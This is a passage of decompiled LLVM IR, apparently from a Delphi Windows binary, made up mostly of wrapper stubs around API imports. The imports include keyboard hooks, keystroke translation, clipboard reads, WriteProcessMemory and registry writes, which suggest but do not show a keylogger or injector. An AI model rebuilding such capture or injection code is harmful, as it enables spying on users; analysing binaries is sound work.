  store i32 %5, i32* %3, align 4, !insn.addr !85
  br label %dec_label_pc_4036c6, !insn.addr !85

dec_label_pc_4036c6:                              ; preds = %dec_label_pc_4036c2, %dec_label_pc_4036bc, %dec_label_pc_4036b8
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036c8() local_unnamed_addr {
dec_label_pc_4036c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208333, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403718:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_40371d() local_unnamed_addr {
dec_label_pc_40371d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_403720() local_unnamed_addr {
dec_label_pc_403720:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403725() local_unnamed_addr {
dec_label_pc_403725:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403767() local_unnamed_addr {
dec_label_pc_403767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038bf() local_unnamed_addr {
dec_label_pc_4038bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_40396b() local_unnamed_addr {
dec_label_pc_40396b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a6f() local_unnamed_addr {
dec_label_pc_403a6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403c7e() local_unnamed_addr {
dec_label_pc_403c7e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403c87() local_unnamed_addr {
dec_label_pc_403c87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403c88() local_unnamed_addr {
dec_label_pc_403c88:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403c8f, label %dec_label_pc_403c8c, !insn.addr !100

dec_label_pc_403c8c:                              ; preds = %dec_label_pc_403c88
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403c8f, !insn.addr !101

dec_label_pc_403c8f:                              ; preds = %dec_label_pc_403c8c, %dec_label_pc_403c88
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403c90() local_unnamed_addr {
dec_label_pc_403c90:
  %0 = call i32 @function_403c88(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403ca8:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cad() local_unnamed_addr {
dec_label_pc_403cad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cb0:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403f84:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403f89() local_unnamed_addr {
dec_label_pc_403f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403f8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f8b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_40403a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40403f() local_unnamed_addr {
dec_label_pc_40403f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_404041(i32 %arg1) local_unnamed_addr {
dec_label_pc_404041:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_404092:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_404097() local_unnamed_addr {
dec_label_pc_404097:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_404099(i32 %arg1) local_unnamed_addr {
dec_label_pc_404099:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.24() local_unnamed_addr {
dec_label_pc_404170:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_404178:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_404180:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404188:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.22(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404190:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.23(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_404198:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041ac:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042b0:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"(i32) local_unnamed_addr

define i32 @function_404304() local_unnamed_addr {
dec_label_pc_404304:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_409658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_409658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404329() local_unnamed_addr {
dec_label_pc_404329:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40432e() local_unnamed_addr {
dec_label_pc_40432e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_404330(i32 %arg1) local_unnamed_addr {
dec_label_pc_404330:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404334() local_unnamed_addr {
dec_label_pc_404334:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_409658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_40433c() local_unnamed_addr {
dec_label_pc_40433c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_409660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_409660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_404361() local_unnamed_addr {
dec_label_pc_404361:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404366() local_unnamed_addr {
dec_label_pc_404366:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404368(i32 %arg1) local_unnamed_addr {
dec_label_pc_404368:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_40436c() local_unnamed_addr {
dec_label_pc_40436c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_409660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_404374() local_unnamed_addr {
dec_label_pc_404374:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_40437c(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_40437c:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_404384(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_404384:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_40438c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40438c:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_404394(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_40439c(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_40439c:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043a4(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043a4:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043ac(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043ac:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043b4(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043b4:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043bc(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043bc:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043c4(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043c4:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043cc(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043cc:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_4043d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4043d4:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_4043dc(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_4043dc:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_4043e4(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_4043e4:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_4043ec() local_unnamed_addr {
dec_label_pc_4043ec:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_4043f4(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_4043f4:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_4043fc(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_4043fc:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404404(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404404:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_40440c(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_40440c:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404414(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404414:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_40441c() local_unnamed_addr {
dec_label_pc_40441c:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404424(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404424:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_40442c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40442c:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404434(i32* %hMem) local_unnamed_addr {
dec_label_pc_404434:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_40443c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40443c:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404444(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404444:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_40444c(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_40444c:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404454(i32* %hFile) local_unnamed_addr {
dec_label_pc_404454:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_40445c(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_40445c:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404464(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404464:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_40446c() local_unnamed_addr {
dec_label_pc_40446c:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_404474(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_404474:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_40447c(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_40447c:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_404484(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_404484:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_40448c(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_40448c:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_404494(i32 %i) local_unnamed_addr {
dec_label_pc_404494:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_40449c(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_40449c:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044a4(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044a4:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044b4(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044b4:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044bc(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044bc:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044c4(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044c4:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044cc(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044cc:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_4044d4(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_4044d4:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_4044dc(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_4044dc:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_4044e4(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_4044e4:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_4044ec(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_4044ec:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_4044f4(i32 %uFormat) local_unnamed_addr {
dec_label_pc_4044f4:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_4044fc(i32* %hWnd) local_unnamed_addr {
dec_label_pc_4044fc:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404504(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404504:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_40450c(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_40450c:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404514(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404514:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_40451c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40451c:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404524(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404524:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_40452c(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_40452c:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404534(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404534:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_40453c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40453c:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404544(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404544:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_40454c:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404554(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404554:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_40455c(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_40455c:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404564(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404564:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_40456c(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_40456c:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_404574(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_404574:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_40457c(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_40457c:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_404584(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_404584:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_40458c(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_40458c:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_404594(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_404594:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_40459c(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_40459c:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045a4(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045a4:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045ac() local_unnamed_addr {
dec_label_pc_4045ac:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045b4:
  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404614() local_unnamed_addr {
dec_label_pc_404614:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
